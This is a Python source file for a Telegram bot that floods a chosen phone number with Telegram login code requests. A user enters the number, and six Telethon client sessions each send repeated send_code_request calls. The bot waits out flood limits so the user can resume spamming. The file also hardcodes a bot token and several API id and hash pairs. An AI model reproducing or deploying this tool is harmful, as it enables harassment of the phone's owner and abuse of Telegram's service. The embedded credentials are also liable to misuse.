import os
import re
import time
import asyncio
import requests
from flask import Flask, request
import telebot
from telebot import types
from telethon import TelegramClient, errors

TOKEN = "8645900110:AAGpHWaoA9sitUw7KR34NGTJNSKkFxDswgM"
ACCOUNTS = [
    {"api_id": 33788912, "api_hash": "175c63ac822b43d48b32776ee6b82761"},
    {"api_id": 33590106, "api_hash": "b40ac10586c1d243b6180c7f9a4feff2"},
    {"api_id": 39934985, "api_hash": "d0ff8b0d846856b0a01a99379b96e9bd"},
    {"api_id": 7216741, "api_hash": "1e85ff32d1cabb4e6e9537ae2d8218ca"},
    {"api_id": 31360840, "api_hash": "4279cc0d7ab41331200a13bf61152f4a"},
    {"api_id": 38299331, "api_hash": "fb5e560c3bda2db7541770b2294ee137"}
]

bot = telebot.TeleBot(TOKEN, threaded=False)
user_states = {}
clients = []
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

def init_clients():
    async def _init():
        for acc in ACCOUNTS:
            client = TelegramClient(None, acc["api_id"], acc["api_hash"])
            await client.connect()
            clients.append(client)
    loop.run_until_complete(_init())

init_clients()

def clean_phone(phone):
    phone = re.sub(r'[^0-9+]', '', phone)
    if not phone.startswith('+'):
        phone = '+' + phone
    return phone

def send_codes_sync(chat_id, msg_id, phone):
    async def send_codes():
        log_msg = bot.send_message(chat_id, "otpravka nachata...")
        max_flood = 0
        total_sent = 0
        results = []

        async def send_one_client(client, idx):
            nonlocal max_flood, total_sent
            sent = 0
            attempt = 0
            while attempt < 6:
                try:
                    await client.send_code_request(phone)
                    sent += 1
                    total_sent += 1
                    attempt += 1
                    await asyncio.sleep(2)
                except errors.FloodWaitError as e:
                    if e.seconds > max_flood:
                        max_flood = e.seconds
                    remaining = e.seconds
                    while remaining > 0:
                        bot.edit_message_text(f"floodwait - {remaining} sekund", chat_id, msg_id)
                        await asyncio.sleep(1)
                        remaining -= 1
                    attempt += 1
                except Exception as e:
                    print(f"[ERROR] Akk{idx}: {e}")
                    await asyncio.sleep(2)
                    attempt += 1
            return sent

        tasks = [send_one_client(client, i+1) for i, client in enumerate(clients)]
        results = await asyncio.gather(*tasks)
        total_sent = sum(results)
        bot.edit_message_text(f"otpravleno {total_sent} codov", chat_id, log_msg.message_id)
        bot.edit_message_text("gotovo", chat_id, msg_id)
        if max_flood > 0:
            remaining = max_flood
            while remaining > 0:
                bot.edit_message_text(f"floodwait - {remaining} sekund", chat_id, msg_id)
                time.sleep(1)
                remaining -= 1
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("spam", callback_data="spam"))
        bot.edit_message_text("floodwait zakonchen, mozhesh dalshe spamit", chat_id, msg_id, reply_markup=kb)
        if chat_id in user_states:
            user_states[chat_id]["timer_task"] = None

    loop.run_until_complete(send_codes())

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("spam", callback_data="spam"))
    sent = bot.reply_to(message, "privet, chtob spamit nashmi vnizu (spam)", reply_markup=kb)
    user_states[chat_id] = {"message_id": sent.message_id, "waiting_phone": False}

@bot.callback_query_handler(func=lambda call: call.data == "spam")
def spam_callback(call):
    chat_id = call.message.chat.id
    state = user_states.get(chat_id)
    if not state:
        bot.answer_callback_query(call.id)
        return
    bot.edit_message_text("napishi nomer", chat_id, state["message_id"])
    state["waiting_phone"] = True
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda message: True)
def handle_phone(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    if not state or not state.get("waiting_phone"):
        return
    phone = clean_phone(message.text)
    state["waiting_phone"] = False
    bot.delete_message(chat_id, message.message_id)
    send_codes_sync(chat_id, state["message_id"], phone)

WEBHOOK_URL = "https://spam-production-64ec.up.railway.app/webhook"
app = Flask(__name__)

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_str = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_str)
        bot.process_new_updates([update])
        return '', 200
    return '', 403

if __name__ == "__main__":
    bot.remove_webhook()
    resp = requests.get(f"https://api.telegram.org/bot{TOKEN}/setWebhook?url={WEBHOOK_URL}")
    if resp.status_code != 200:
        print("Webhook set error:", resp.text)
    else:
        print("Webhook set:", resp.json())
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
